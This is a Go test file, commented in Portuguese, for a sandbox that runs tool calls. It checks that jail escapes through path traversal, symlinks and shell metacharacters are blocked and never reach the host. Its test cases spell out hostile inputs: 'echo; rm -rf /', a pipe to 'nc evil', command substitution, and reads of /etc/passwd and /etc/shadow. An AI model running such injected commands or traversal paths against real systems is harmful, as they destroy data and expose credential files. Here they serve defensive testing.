package sandbox

import (
	"context"
	"errors"
	"testing"
)

// TestSecurity_JailEscapeBlocked prova o critério de segurança: uma tentativa de
// escapar via symlink/metacaracteres/traversal NÃO alcança o host (bloqueada).
func TestSecurity_JailEscapeBlocked(t *testing.T) {
	cases := []struct {
		name string
		call ToolCall
	}{
		{"traversal relativo", ToolCall{Command: "cat", Path: "../../etc/passwd"}},
		{"path absoluto posix", ToolCall{Command: "cat", Path: "/etc/passwd"}},
		{"path absoluto windows", ToolCall{Command: "cat", Path: "C:/Windows/System32/config"}},
		{"metachar ponto-e-virgula", ToolCall{Command: "echo; rm -rf /"}},
		{"metachar pipe", ToolCall{Command: "echo", Args: []string{"a", "| nc evil 1"}}},
		{"metachar command-substitution", ToolCall{Command: "echo", Args: []string{"$(whoami)"}}},
		{"metachar backtick", ToolCall{Command: "echo `id`"}},
		{"metachar redireccao", ToolCall{Command: "echo", Args: []string{"> /etc/hosts"}}},
		{"traversal em arg", ToolCall{Command: "read", Args: []string{"../../secret"}}},
		{"nul byte", ToolCall{Command: "cat", Path: "ok\x00/../escape"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			store := newStore(t)
			fake := NewFakeDriver()
			// Sentinela no host: NUNCA deve ser alcançada.
			fake.PlantHostFile("/etc/passwd", []byte("root:x:0:0"))
			launcher, err := NewLauncher(fake, WithEventSink(NewEventStoreSink(store)))
			if err != nil {
				t.Fatalf("NewLauncher: %v", err)
			}
			_, err = launcher.run(context.Background(), ExecRequest{
				RunID: "run-esc", StepID: "step-esc", Call: tc.call,
			})
			if !errors.Is(err, ErrJailEscape) {
				t.Fatalf("err = %v, esperado ErrJailEscape", err)
			}
			if fake.HostTouches() != 0 {
				t.Fatalf("host tocado %d vezes num escape (esperado 0)", fake.HostTouches())
			}
			if fake.EscapeAttempts() == 0 {
				t.Fatal("tentativa de escape nao contabilizada")
			}
			// O destroy foi na mesma garantido (sem órfãs).
			destroyed := eventsOfType(readEvents(t, store, "run-esc"), EventInstanceDestroyed)
			if len(destroyed) != 1 {
				t.Fatalf("destroyed = %d, esperado 1", len(destroyed))
			}
		})
	}
}

// TestSecurity_SymlinkEscapeBlocked prova especificamente o bloqueio de escape via
// symlink cujo alvo aponta para fora do jail.
func TestSecurity_SymlinkEscapeBlocked(t *testing.T) {
	fake := NewFakeDriver()
	fake.PlantHostFile("/etc/shadow", []byte("secret-hash"))
	launcher, err := NewLauncher(fake)
	if err != nil {
		t.Fatalf("NewLauncher: %v", err)
	}
	// Cria a instância para plantar o symlink, depois exercita o Exec por escape.
	inst, err := fake.Create(context.Background(), capability{launcher: launcher}, Spec{
		RunID: "r", StepID: "s", Kind: DriverFake, Isolation: HardenedIsolation(),
	})
	if err != nil {
		t.Fatalf("Create: %v", err)
	}
	// symlink "evil" -> "/etc/shadow" (alvo absoluto, fora do jail).
	fake.Symlink(inst, "evil", "/etc/shadow")
	_, err = fake.Exec(context.Background(), capability{launcher: launcher}, inst, ExecRequest{
		RunID: "r", StepID: "s", Call: ToolCall{Command: "cat", Path: "evil"},
	})
	if !errors.Is(err, ErrJailEscape) {
		t.Fatalf("err = %v, esperado ErrJailEscape por symlink", err)
	}
	if fake.HostTouches() != 0 {
		t.Fatalf("host tocado %d vezes (esperado 0)", fake.HostTouches())
	}
}

// TestSecurity_SymlinkEscapeViaParentComponentBlocked prova o bloqueio de escape
// quando o symlink está num COMPONENTE-PAI atravessado (não no caminho exacto):
// 'sub' -> '../../host' acedido via 'sub/ficheiro'. Sem resolução por-componente
// este escape passaria despercebido.
func TestSecurity_SymlinkEscapeViaParentComponentBlocked(t *testing.T) {
	fake := NewFakeDriver()
	fake.PlantHostFile("/etc/shadow", []byte("secret-hash"))
	launcher, err := NewLauncher(fake)
	if err != nil {
		t.Fatalf("NewLauncher: %v", err)
	}
	cap := capability{launcher: launcher}
	inst, err := fake.Create(context.Background(), cap, Spec{
		RunID: "r", StepID: "s", Kind: DriverFake, Isolation: HardenedIsolation(),
	})
	if err != nil {
		t.Fatalf("Create: %v", err)
	}
	// symlink no componente-pai 'sub' -> '../../host' (o alvo escapa a raiz do jail).
	fake.Symlink(inst, "sub", "../../host")
	_, err = fake.Exec(context.Background(), cap, inst, ExecRequest{
		RunID: "r", StepID: "s", Call: ToolCall{Command: "cat", Path: "sub/ficheiro"},
	})
	if !errors.Is(err, ErrJailEscape) {
		t.Fatalf("err = %v, esperado ErrJailEscape por symlink em componente-pai", err)
	}
	if fake.HostTouches() != 0 {
		t.Fatalf("host tocado %d vezes (esperado 0)", fake.HostTouches())
	}
}

// TestSecurity_SymlinkToInJailTargetResolves prova que um symlink cujo alvo fica
// DENTRO do jail resolve normalmente (o modelo SEGUE o symlink em vez de o tratar
// cegamente como escape): 'link' -> 'real', ler 'link/data.txt' devolve o conteúdo
// de 'real/data.txt'.
func TestSecurity_SymlinkToInJailTargetResolves(t *testing.T) {
	fake := NewFakeDriver()
	launcher, err := NewLauncher(fake)
	if err != nil {
		t.Fatalf("NewLauncher: %v", err)
	}
	cap := capability{launcher: launcher}
	inst, err := fake.Create(context.Background(), cap, Spec{
		RunID: "r", StepID: "s", Kind: DriverFake, Isolation: HardenedIsolation(),
	})
	if err != nil {
		t.Fatalf("Create: %v", err)
	}
	if _, err := fake.Exec(context.Background(), cap, inst, ExecRequest{
		RunID: "r", StepID: "s", Call: ToolCall{Command: "write", Path: "real/data.txt", Write: []byte("IN-JAIL")},
	}); err != nil {
		t.Fatalf("Exec write: %v", err)
	}
	fake.Symlink(inst, "link", "real")
	res, err := fake.Exec(context.Background(), cap, inst, ExecRequest{
		RunID: "r", StepID: "s", Call: ToolCall{Command: "read", Path: "link/data.txt"},
	})
	if err != nil {
		t.Fatalf("Exec read via symlink: %v", err)
	}
	if string(res.Stdout) != "IN-JAIL" {
		t.Fatalf("leitura via symlink = %q, esperado IN-JAIL", res.Stdout)
	}
	if fake.HostTouches() != 0 {
		t.Fatalf("host tocado %d vezes (esperado 0)", fake.HostTouches())
	}
}

// TestSecurity_HostSentinelHasRefutationPower prova que os sentinelas de segurança
// TÊM poder de refutação: forçar uma leitura do host pelo ÚNICO funnel (readHost)
// incrementa hostTouch, e accessHostSocket marca hostSocketAccessed. Sem isto,
// HostTouches()==0 e !HostSocketAccessed() seriam tautologias (verdadeiras só por
// ausência de código). Assim, as asserções ==0/!accessed nos outros testes têm
// verdadeiro poder de falhar se um caminho futuro tocar o host.
func TestSecurity_HostSentinelHasRefutationPower(t *testing.T) {
	fake := NewFakeDriver()
	fake.PlantHostFile("/etc/passwd", []byte("root:x:0:0"))
	// Baseline: nenhum acesso ao host.
	if fake.HostTouches() != 0 || fake.HostSocketAccessed() {
		t.Fatalf("baseline nao-zero: touches=%d socket=%v", fake.HostTouches(), fake.HostSocketAccessed())
	}
	// Forçar uma leitura do host: o contador DEVE disparar (refutação real).
	if v, ok := fake.readHost("/etc/passwd"); !ok || string(v) != "root:x:0:0" {
		t.Fatalf("readHost = %q,%v", v, ok)
	}
	if fake.HostTouches() != 1 {
		t.Fatalf("hostTouch = %d, esperado 1 apos leitura forcada (sentinela sem poder de refutacao)", fake.HostTouches())
	}
	// Forçar um acesso ao socket do host: o sentinela DEVE virar.
	fake.accessHostSocket()
	if !fake.HostSocketAccessed() {
		t.Fatal("hostSocketAccessed nao disparou apos acesso forcado")
	}
}

// TestSecurity_JailWriteStaysInJail prova que uma escrita/leitura LEGÍTIMA fica
// contida no jail (e nunca no host).
func TestSecurity_JailWriteStaysInJail(t *testing.T) {
	fake := NewFakeDriver()
	fake.PlantHostFile("out.txt", []byte("HOST"))
	launcher, err := NewLauncher(fake)
	if err != nil {
		t.Fatalf("NewLauncher: %v", err)
	}
	cap := capability{launcher: launcher}
	inst, err := fake.Create(context.Background(), cap, Spec{RunID: "r", StepID: "s", Kind: DriverFake, Isolation: HardenedIsolation()})
	if err != nil {
		t.Fatalf("Create: %v", err)
	}
	// Escreve dentro do jail.
	if _, err := fake.Exec(context.Background(), cap, inst, ExecRequest{
		RunID: "r", StepID: "s", Call: ToolCall{Command: "write", Path: "out.txt", Write: []byte("JAIL")},
	}); err != nil {
		t.Fatalf("Exec write: %v", err)
	}
	// Lê de volta — o valor é o do jail, nunca o do host.
	res, err := fake.Exec(context.Background(), cap, inst, ExecRequest{
		RunID: "r", StepID: "s", Call: ToolCall{Command: "read", Path: "out.txt"},
	})
	if err != nil {
		t.Fatalf("Exec read: %v", err)
	}
	if string(res.Stdout) != "JAIL" {
		t.Fatalf("leitura = %q, esperado JAIL (jail, nao host)", res.Stdout)
	}
	if fake.HostTouches() != 0 {
		t.Fatalf("host tocado %d vezes (esperado 0)", fake.HostTouches())
	}
}
